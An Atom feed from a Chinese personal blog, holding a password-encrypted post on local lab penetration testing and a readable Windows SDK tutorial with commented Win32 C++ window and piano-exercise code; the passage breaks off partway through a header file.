<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>H4ckbird&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/51a9f82d05f49451e3509af2b4abe068</icon>
  <subtitle>欲速则不达</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-11-25T11:04:23.171Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>H4ckbird</name>
    <email>stupidbird6379@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>好用的软件资源推荐</title>
    <link href="http://example.com/2022/11/25/%E5%A5%BD%E7%94%A8%E7%9A%84%E8%BD%AF%E4%BB%B6%E8%B5%84%E6%BA%90%E6%8E%A8%E8%8D%90/"/>
    <id>http://example.com/2022/11/25/%E5%A5%BD%E7%94%A8%E7%9A%84%E8%BD%AF%E4%BB%B6%E8%B5%84%E6%BA%90%E6%8E%A8%E8%8D%90/</id>
    <published>2022-11-25T11:02:09.000Z</published>
    <updated>2022-11-25T11:04:23.171Z</updated>
    
    
    
    
    <category term="资源" scheme="http://example.com/categories/%E8%B5%84%E6%BA%90/"/>
    
    
    <category term="软件推荐" scheme="http://example.com/tags/%E8%BD%AF%E4%BB%B6%E6%8E%A8%E8%8D%90/"/>
    
  </entry>
  
  <entry>
    <title>本地靶场渗透</title>
    <link href="http://example.com/2022/11/25/%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>http://example.com/2022/11/25/%E6%9C%AC%E5%9C%B0%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</id>
    <published>2022-11-25T02:01:56.000Z</published>
    <updated>2022-11-25T02:05:18.118Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="638788eaa1ccee88c7a2e01354e36332606a57bfd4d1cd8cc36fe4302547c4f9">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f7f88b5df88cbfdfe86c0f0a40d3b4817571d6eb6543dcb651fa9e914493cc625e4d59a5e75a78ec76cd07ec534cc6a03a7e5c3e340226fd6859a0206b19d578cecdca14edd00e1a492fcf7c692e1eb5fa76c0e611335c9e03dae6d03c9f2e11ec3c1eba01b2a8977f08973e806bd3bb2e82b5dc47650655cc381b50430c19cf5068e7375e4c605bf576db213a6f07a37970457404e30e03954732b712b79d09f474e1993216801ea0f4d2d813101518752f00c10f6d8cd915ae5d621a8add23d0337973b68fd23e2f6965c1d5d7dc029977cc8ba8845a9014745b112165def2953a712f221ec722f88150b942d5aff1b4d9af1e3f6055a879b45eed9d1171aaaac77b4dadf93176ee5161301771d1669d2b8cc68e6c38a53185e4cb35f858b5e1b7fc45d99f5cacb21b27c5c764e154fcbd00f67bf876549d63288fd4878576c564b4ca492ead70b515f7b42ffc70860fb33f30acb2e6dbea09f4548dd8ead6e09f9930c6a3ec802d9da88184c562ca82552006368ba56db0d78d5fccc999e6179daf1d6ea39d0df130e5756b92e3ab709e5c3b2afee4861d37872a8109e58384c24d37c838d190fde0f1c440ea70d64cb4a68ffb8d27bb26968e5ad0d06f2d0e91d317a71626a9be6b48832d66eac9d74fc3b4611f21876c84f80131f36b8f093edbbaa070a1a9f5038eb7f3f9c0adea60b1fe847037bd5e0622fa4e9e725ed5f9e944590d7a799b91b51430c0aa6a0c3c893f12bf6c60c9b9eff2221b8ee9c88a28bf3819b61fc204caf2e85445713c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时不对普通用户开放</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">渗透测试简单学习</summary>
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="靶场渗透" scheme="http://example.com/tags/%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows-SDK</title>
    <link href="http://example.com/2022/11/24/Windows-SDK/"/>
    <id>http://example.com/2022/11/24/Windows-SDK/</id>
    <published>2022-11-24T08:27:52.000Z</published>
    <updated>2022-11-24T08:53:09.011Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Windows窗口的创建流程"><a href="#Windows窗口的创建流程" class="headerlink" title="Windows窗口的创建流程"></a>Windows窗口的创建流程</h1><h2 id="注册一个窗口类"><a href="#注册一个窗口类" class="headerlink" title="注册一个窗口类"></a>注册一个窗口类</h2><p>RegisterClass</p><p>1.1、提供一个消息处理函数（窗口回调函数）</p><p>1.2、提供一个窗口类的名字</p><h2 id="创建一个窗口"><a href="#创建一个窗口" class="headerlink" title="创建一个窗口"></a>创建一个窗口</h2><p> GreateWindow 能够创建一个窗口，得到一个窗口句柄，是系统找到串口的一个标识</p><h2 id="更新显示窗口"><a href="#更新显示窗口" class="headerlink" title="更新显示窗口"></a>更新显示窗口</h2><p>UpdateWindow（更新）</p><p>Show Window（显示）</p><h2 id="编写一个消息循环"><a href="#编写一个消息循环" class="headerlink" title="编写一个消息循环"></a>编写一个消息循环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">While(GetMessage)(…))&#123;</span><br><span class="line">TranslateMessage();</span><br><span class="line">DispatchMessage(…);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编写一个消息处理函数（窗口回调函数）"><a href="#编写一个消息处理函数（窗口回调函数）" class="headerlink" title="编写一个消息处理函数（窗口回调函数）"></a>编写一个消息处理函数（窗口回调函数）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD WINAPI WndProc(HWND hWnd,int nMessage,WPARAM wParam,LPARAM lParam)&#123;</span><br><span class="line">Switch(message)&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>问题1：*</strong>怎么理解这一些代码，这个过程这段代码，是定形式，是微软规定好的流程*</p><p><strong>问题2：*</strong>消息是怎么获取到的*</p><p>只有窗口才能够收消息，窗口收的息，需要通过 GetMessage来从程序的消息队列中获取到。你需要创建一个窗口，然后在创建窗口之后就可以使用 GetMessage获得创建的窗口收到的消息</p><p><strong>问题3：*</strong>消息队列在哪里，我为什么看不到？？*</p><p>因为大部分的事情都是操作系统帮你完成了比如说消息队列，比如往消息队列添加消息，从消息队列中得到消息，删除已经得到的</p><p><strong>问题4：*</strong>什么是回调函数？谁调用了回调函数？*</p><p>回调函数就不是你调用的函数你提供了一个函数给操作系统，操作系统在合适的时机去调用你提供的函数。因为只有操作系统才能知道什么时候得到了消息，只有我才知道我的程序怎么处理消息</p><p><strong>问题5：*</strong>为什么创建窗口要先注册窗口类？为什么创建完窗口要写更新显示窗口？为什么消息循环要写 tMessage DispatchMessage并放在一个循环里面？？*需要先有一个板（窗口共有一些特性，放在窗口类里面），然后创建窗口的时候根据模板去创建</p><p>刚创建出来的窗口是隐藏起来的，比如 ShowWindow给显示出来， UpdateWindow能够让窗口产生一次自绘（WMPAINT）</p><p>的作用就是从滴息队列中获取消息</p><p>DispatchMessage的作用就是调用口相对应的回调函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//用于在调试窗口输出信息</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">trace</span><span class="params">(CONST TCHAR* format, ...)</span><span class="comment">//变参函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">TCHAR buffer[<span class="number">1000</span>];</span><br><span class="line">va_list argptr;</span><br><span class="line"><span class="built_in">va_start</span>(argptr,format);</span><br><span class="line"><span class="comment">//将格式化信息写入指定缓冲区</span></span><br><span class="line"><span class="built_in">wvsprintf</span>(buffer, format, argptr);</span><br><span class="line"><span class="built_in">va_end</span>(argptr);</span><br><span class="line"><span class="comment">//将缓冲区信息输出</span></span><br><span class="line"><span class="built_in">OutputDebugString</span>(buffer);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//必须提供窗口回调函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HWND hWnd,<span class="comment">//哪个串口的消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">UINT uMsg,<span class="comment">//消息的类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">LPARAM lParam<span class="comment">//消息的附加参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//使用分支语句处理要操作的消息</span></span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:<span class="comment">//窗口创建消息，第一个被产生 的消息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;打开成功&quot;</span>, <span class="string">L&quot;标题&quot;</span>, MB_OK);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//右上角关闭按钮</span></span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;确认是否关闭&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line"><span class="comment">//销毁当前窗口</span></span><br><span class="line"><span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line"><span class="comment">//结束消息循环</span></span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//窗口移动消息，移动窗口位置响应</span></span><br><span class="line"><span class="keyword">case</span> WM_MOVE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//lParam保存左上角坐标</span></span><br><span class="line">WORD x = <span class="built_in">LOWORD</span>(lParam);</span><br><span class="line">WORD y = <span class="built_in">HIWORD</span>(lParam);</span><br><span class="line"><span class="built_in">trace</span>(<span class="string">L&quot;POS(%d,%d)\n&quot;</span>, x, y);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将不想处理的消息传递给这个函数，进行默认参数</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd,uMsg,wParam,lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">prin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">trace</span>(<span class="string">L&quot;一次调用&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HINSTANCE hInstance,<span class="comment">//实例句柄，表示当前应用程序，用于获取资源</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ HINSTANCE hPrevInstance,<span class="comment">//句柄，标识上一个打开的应用程序</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_opt_ LPSTR lpCmdLine,<span class="comment">//命令行参数，对应的是main函数的argv参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">_In_ <span class="type">int</span> nCmdShow<span class="comment">//显示方式，最大化最小化</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">prin</span>();</span><br><span class="line"><span class="comment">//1、创建窗口类，</span></span><br><span class="line">WNDCLASS WnsClass = &#123;<span class="number">0</span>&#125;;<span class="comment">//窗口结构体初始化为0</span></span><br><span class="line">WnsClass.lpfnWndProc = WndProc;<span class="comment">//一个回调函数的地址</span></span><br><span class="line">WnsClass.lpszClassName = <span class="string">L&quot;myclass&quot;</span>;<span class="comment">//结构体名字，表示当前的窗口，由于是宽字符</span></span><br><span class="line">WnsClass.hCursor = <span class="built_in">LoadCursor</span>(<span class="literal">NULL</span>, IDC_ARROW);<span class="comment">//使用默认光标</span></span><br><span class="line">WnsClass.style = CS_VREDRAW | CS_HREDRAW;<span class="comment">//窗口改变大小后重绘制</span></span><br><span class="line">WnsClass.hInstance = hInstance;<span class="comment">//标识当前应用程序</span></span><br><span class="line">WnsClass.hIcon = <span class="built_in">LoadIcon</span>(<span class="literal">NULL</span>,IDI_APPLICATION);<span class="comment">//使用默认图标</span></span><br><span class="line">WnsClass.hbrBackground = <span class="built_in">CreateSolidBrush</span>(<span class="built_in">RGB</span>(<span class="number">0</span>, <span class="number">0xff</span>, <span class="number">0</span>));<span class="comment">//背景颜色</span></span><br><span class="line">WnsClass.cbWndExtra = WnsClass.cbClsExtra = <span class="number">0</span>;<span class="comment">//扩展，几乎没有用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2、注册已经注册好的窗口，注册后的窗口才能使用</span></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> == <span class="built_in">RegisterClass</span>(&amp;WnsClass))<span class="comment">//传入需要注册的结构体地址</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;打开失败&quot;</span>, <span class="string">L&quot;错误&quot;</span>, MB_OK | MB_ICONERROR);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3通过设置好的窗口来创建</span></span><br><span class="line">HWND hWnd=<span class="built_in">CreateWindow</span>(<span class="comment">//返回值是一个窗口句柄</span></span><br><span class="line"><span class="string">L&quot;myclass&quot;</span>,<span class="comment">//使用注册好的窗口类</span></span><br><span class="line"><span class="string">L&quot;第一个窗口&quot;</span>,<span class="comment">//窗口的显示名称</span></span><br><span class="line">WS_OVERLAPPEDWINDOW,<span class="comment">//窗口显示类型：重叠窗口</span></span><br><span class="line">CW_USEDEFAULT, <span class="number">0</span>,<span class="comment">//窗口左上角的坐标，使用CW_USEDEFAULT,可以省略y</span></span><br><span class="line">CW_USEDEFAULT, <span class="number">0</span>,<span class="comment">//窗口的高度和宽度，使用CW_USEDEFAULT，可以省略宽度</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//当前的窗口的副窗口</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//菜单句柄，标识当前使用哪个菜单</span></span><br><span class="line">hInstance,<span class="comment">//实例句柄，表示当前窗口属于哪个应用程序</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4、显示并更新窗口</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(hWnd, SW_SHOWNORMAL);<span class="comment">//默认不显示，所以，我们需要手动显示</span></span><br><span class="line"><span class="built_in">UpdateWindow</span>(hWnd);</span><br><span class="line"></span><br><span class="line"><span class="comment">//5、编写消息循环</span></span><br><span class="line">MSG msg = &#123; <span class="number">0</span> &#125;;<span class="comment">//保存消息的结构体</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(</span><br><span class="line">&amp;msg,<span class="comment">//保存信息来源的结构体</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//窗口句柄，指定当前接收哪个窗口的消息，NULL表示所有</span></span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>))<span class="comment">//表示想要接收消息的范围0，表示所有</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//将消息结构体中的前四个参数传递给对应窗口类中填写 的回调函数</span></span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="二、练习题"><a href="#二、练习题" class="headerlink" title="二、练习题"></a>二、练习题</h1><h2 id="题：钢琴"><a href="#题：钢琴" class="headerlink" title="题：钢琴"></a>题：钢琴</h2><p>描述：使用所提供的音乐资源写出可以根据按键弹奏播放对应的曲调</p><p>进阶：本地提供一个钢琴谱，根据琴谱自动弹奏</p><h3 id="main-cpp-主函数"><a href="#main-cpp-主函数" class="headerlink" title="main.cpp//主函数"></a>main.cpp//主函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Data.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;winmm.lib&quot;</span>)</span></span><br><span class="line"><span class="comment">//用宏自定义消息类型</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UM_MYMESSAGE WM_USER+1</span></span><br><span class="line"><span class="comment">//声明</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hWnd,UINT uMsg,WPARAM wParam,LPARAM lParam)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">en_zch</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//设置英文输入法</span></span><br><span class="line"><span class="built_in">keybd_event</span>(VK_SHIFT, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">keybd_event</span>(VK_SHIFT, <span class="number">0</span>, KEYEVENTF_KEYUP, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance,HINSTANCE hPronstance, LPSTR lpCmdLine,<span class="type">int</span> nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//注册窗口</span></span><br><span class="line">WNDCLASS ws = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">ws.lpfnWndProc= WndProc;</span><br><span class="line">ws.hInstance=hInstance;</span><br><span class="line">ws.lpszClassName = <span class="string">L&quot;piano&quot;</span>;</span><br><span class="line"><span class="built_in">RegisterClass</span>(&amp;ws);</span><br><span class="line"><span class="comment">//创建窗口</span></span><br><span class="line">HWND hwnd=<span class="built_in">CreateWindow</span>(<span class="string">L&quot;piano&quot;</span>, <span class="string">L&quot;钢琴&quot;</span>, WS_OVERLAPPEDWINDOW , <span class="number">500</span>, <span class="number">500</span>, <span class="number">800</span>, <span class="number">800</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//更新显示窗口</span></span><br><span class="line"><span class="built_in">UpdateWindow</span>(hwnd);</span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd,SW_SHOWNORMAL);</span><br><span class="line"><span class="comment">//消息泵</span></span><br><span class="line">MSG msg = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">GetMessage</span>(&amp;msg,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DispatchMessage</span>(&amp;msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//必须提供窗口回调函数</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HWND hWnd,<span class="comment">//哪个串口的消息</span></span></span></span><br><span class="line"><span class="params"><span class="function">UINT uMsg,<span class="comment">//消息的类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">WPARAM wParam,<span class="comment">//虚拟键值</span></span></span></span><br><span class="line"><span class="params"><span class="function">LPARAM lParam<span class="comment">//消息的附加参数</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//创建Data对象</span></span><br><span class="line">Data obj;</span><br><span class="line"><span class="comment">//使用分支语句处理要操作的消息</span></span><br><span class="line"><span class="keyword">switch</span> (uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> WM_CREATE:</span><br><span class="line">&#123;<span class="comment">//开场音乐</span></span><br><span class="line"><span class="built_in">PlaySoundA</span>(<span class="string">&quot;D:\\Project\\WIN_MAIN\\PIANO\\Sound\\LoopyMusic.wav&quot;</span>, <span class="literal">NULL</span>, SND_ASYNC | SND_NODEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (obj.<span class="built_in">ReadData</span>(hWnd))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;检测到你有琴谱，是否播放&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK|MB_OKCANCEL);</span><br><span class="line"><span class="built_in">PostMessage</span>(hWnd, UM_MYMESSAGE,<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//给自定义消息发送</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//自定义响应消息</span></span><br><span class="line"><span class="keyword">case</span> UM_MYMESSAGE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">sizeof</span>(Data::Souce); i++)</span><br><span class="line">&#123;</span><br><span class="line">obj.<span class="built_in">If_Case</span>(Data::Souce[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//右上角关闭按钮</span></span><br><span class="line"><span class="keyword">case</span> WM_CLOSE:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(hWnd, <span class="string">L&quot;是否退出钢琴&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_OK);</span><br><span class="line"><span class="comment">//销毁当前窗口</span></span><br><span class="line"><span class="built_in">DestroyWindow</span>(hWnd);</span><br><span class="line"><span class="comment">//结束消息循环</span></span><br><span class="line"><span class="built_in">PostQuitMessage</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//按键按下响应</span></span><br><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line">&#123;</span><br><span class="line">obj.<span class="built_in">If_Case</span>(wParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将不想处理的消息传递给这个函数，进行默认参数</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">DefWindowProc</span>(hWnd, uMsg, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Data-h-数据类头文件，"><a href="#Data-h-数据类头文件，" class="headerlink" title="Data.h//数据类头文件，"></a>Data.h//数据类头文件，</h3><p>用于本地数据的读取及函数的封装</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span 